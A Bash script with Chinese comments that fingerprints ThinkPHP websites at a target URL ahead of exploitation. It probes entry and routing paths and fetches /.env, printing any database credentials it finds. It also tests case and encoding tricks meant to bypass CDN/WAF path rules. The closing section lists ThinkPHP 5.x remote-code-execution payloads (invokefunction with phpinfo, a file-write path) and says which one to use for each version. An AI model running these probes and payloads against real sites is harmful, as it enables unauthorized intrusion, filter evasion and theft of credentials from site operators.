#!/usr/bin/env bash
# ============================================================================
# ThinkPHP 站点三连判定（含 EdgeOne 大小写绕过）
# 用法: ./poc.sh https://TARGET
#
# 三连 = 三个独立维度，任意一个成立即可定案「这是 ThinkPHP 且版本在可打范围」
#   ① 入口可达性: /index.php 是否存在且行为符合 TP（不 404、有特定头/错误页）
#   ② 路由模式:   PATH_INFO(/index.php/模块/控制器) vs 兼容模式(?s=/模块/控制器)
#   ③ 配置项:     url_route_must / 多应用模式 / 默认模块是否泄露
#
# 【判据】为什么用「错误页指纹」而不是找 RCE payload
#   TP 的错误页在 debug=true 时会输出完整堆栈，含文件路径、版本号、常量。
#   debug=false 时返回 "页面错误！请稍后再试~"，这是极强指纹。
#   两种都无害，且比发 payload 更不容易触发 WAF。
#
# 【EdgeOne / CDN 大小写绕过】
#   部分 CDN 的路径规则大小写不敏感，而 PHP 在 Linux 上区分大小写。
#   所以 /index.PHP 可能绕过基于 /index.php 的封禁规则，却仍能被 PHP 处理。
#   验证方式: 对比 /index.php 与 /index.PHP 的响应差异。
#
# 【常见误报】
#   1. 全站 404 也返回 200（软 404）→ 必须建基线。
#   2. 目标是非 TP 的 PHP 站 → 只是碰巧有 index.php。要看 TP 特有路径是否 404。
#   3. TP 5.1 与 6.x 的路径结构不同，不要用 5.x 的 payload 去打 6.x。
# ============================================================================
set -uo pipefail
source "$(dirname "$0")/../_lib/common.sh"

BASE="${1:-}"
[ -z "$BASE" ] && usage_die "$0 <https://TARGET>"
BASE="${BASE%/}"
preflight || exit 1

# ---- 基线 ----------------------------------------------------------------
log "基线"
BL=$(baseline GET "$BASE")
BL_CODE="${BL%%$'\t'*}"; BL_FP="${BL#*$'\t'}"
dim "随机路径 → $BL_CODE"

hit=0

# ---- ① 入口可达性 --------------------------------------------------------
echo
log "① 入口可达性"
for ep in /index.php /index.php/ /public/index.php /index.php/index /app.php; do
  r=$(reqc GET "$BASE$ep")
  c="${r%%$'\t'*}"; b="${r#*$'\t'}"
  cls=$(classify3 "$c" "$b" "$BL_FP")
  case "$cls" in
    HIT)
      ok "  $ep → $c（非软404）"
      printf '%s' "$b" | head -c 200 | tr -d '\n'; echo
      hit=$((hit+1))
      ;;
    *) dim "  $ep → $c [$cls]" ;;
  esac

  # TP 特有指纹
  if printf '%s' "$b" | grep -qiE 'thinkphp|Think\b|页面错误！请稍后再试|模板不存在|控制器不存在|模块不存在'; then
    ok "  ★ TP 指纹命中: $ep"
    hit=$((hit+1))
  fi
  sleep 0.3
done

# ---- ② 路由模式 ----------------------------------------------------------
echo
log "② 路由模式（兼容模式 ?s= 是否可用）"
for q in '/index.php?s=/index/index' '/index.php?s=index/index' \
         '/index.php/index/index' '/?s=/index/index' '/index.php?s=/index' ; do
  r=$(reqc GET "$BASE$q")
  c="${r%%$'\t'*}"; b="${r#*$'\t'}"
  cls=$(classify3 "$c" "$b" "$BL_FP")
  if [ "$cls" = "HIT" ]; then
    ok "  $q → $c"
    # 关键: 是否暴露「模块不存在」这类区分性错误
    if printf '%s' "$b" | grep -qiE '模块不存在|控制器不存在|方法不存在|module not exists'; then
      ok "  ★ 路由已解析到 dispatcher（错误信息含模块级）"
    fi
    hit=$((hit+1))
  else
    dim "  $q → $c [$cls]"
  fi
  sleep 0.3
done

# ---- ③ 配置项 ------------------------------------------------------------
echo
log "③ 配置与调试信息"
for p in '/index.php?s=/index/\think\app/invokefunction' \
         '/index.php?app=index&mod=index&act=index' \
         '/runtime/log/' '/application/' '/config/' '/.env'; do
  r=$(reqc GET "$BASE$p")
  c="${r%%$'\t'*}"; b="${r#*$'\t'}"
  cls=$(classify3 "$c" "$b" "$BL_FP")
  case "$cls" in
    HIT)
      # 只看是否泄露路径/版本，不发 RCE 参数
      if printf '%s' "$b" | grep -qE '/www/|/var/www|/home/|runtime|vendor/|ThinkPHP V?[0-9]'; then
        ok "  ★ $p 泄露路径/版本"
        printf '%s' "$b" | grep -oE 'ThinkPHP V?[0-9.]+|/www/[^ "<]*|/var/www/[^ "<]*' | head -3 | while read -r l; do
          dim "      $l"
        done
        hit=$((hit+1))
      elif [ "$p" = "/.env" ]; then
        warn "  ★ .env 可直接下载（含数据库凭据）"
        head -c 200 <<< "$b"; echo
        hit=$((hit+1))
      else
        dim "  $p → $c"
      fi
      ;;
    *) dim "  $p → $c [$cls]" ;;
  esac
  sleep 0.3
done

# ---- ④ 大小写绕过 --------------------------------------------------------
echo
log "④ 路径大小写 / 编码绕过（CDN 与 PHP 的大小写敏感性差）"
for pair in "/index.php:/index.PHP" "/index.php:/INDEX.PHP" "/index.php:/index.phP" \
            "/index.php:/index%2ephp" "/index.php:/index.php/" "/index.php:/./index.php" \
            "/index.php://index.php" "/index.php:/index.php%00"; do
  orig="${pair%%:*}"; alt="${pair#*:}"
  c1=$(code_of GET "$BASE$orig")
  c2=$(code_of GET "$BASE$alt")
  if [ "$c2" != "$c1" ] && [ "$c2" != "000" ]; then
    ok "  差异: $alt → $c2（原 $orig → $c1）"
    hit=$((hit+1))
  else
    dim "  无差异: $alt → $c2"
  fi
  sleep 0.3
done

# ---- 结论 ----------------------------------------------------------------
echo
if [ "$hit" -ge 3 ]; then
  ok "判定: 高度疑似 ThinkPHP（命中 $hit 项）"
elif [ "$hit" -ge 1 ]; then
  warn "判定: 可能是 ThinkPHP（命中 $hit 项），需人工确认"
else
  warn "判定: 未发现 TP 特征"
fi

cat <<'EOF'

════ 判定口径 ════
  ① 入口可达 + ② 兼容模式可用 + ③ 有 TP 错误页指纹 = 确认
  只有 ① = 只是有个 index.php，可能不是 TP

  TP 版本区分（决定用哪套 payload）:
    5.0.x  → /index.php?s=/index/\think\app/invokefunction
    5.1.x  → /index.php?s=/index/\think\request/cache
    6.x    → 路由结构变化大，且默认关闭兼容模式

════ 无害版「是否可打」确认（不发 RCE 参数）════
  5.0 求值确认: /index.php?s=/index/\think\app/invokefunction&function=phpinfo&vars[0]=1
    → 若返回 phpinfo 页面，说明 invokefunction 未被禁，可执行任意函数
    （这一步已经能看到 phpinfo，本身就是证据，不必再往下）
  5.1 求值确认: /index.php?s=/index/\think\template\driver\file/write
    → 用于写文件，属高危写操作

════ 注意 ════
  上面的 invokefunction / file/write 都是**实际执行**，会留下痕迹。
  先确认授权，并且优先用 debug 报错（无害）来定版本，再决定是否发 payload。
EOF
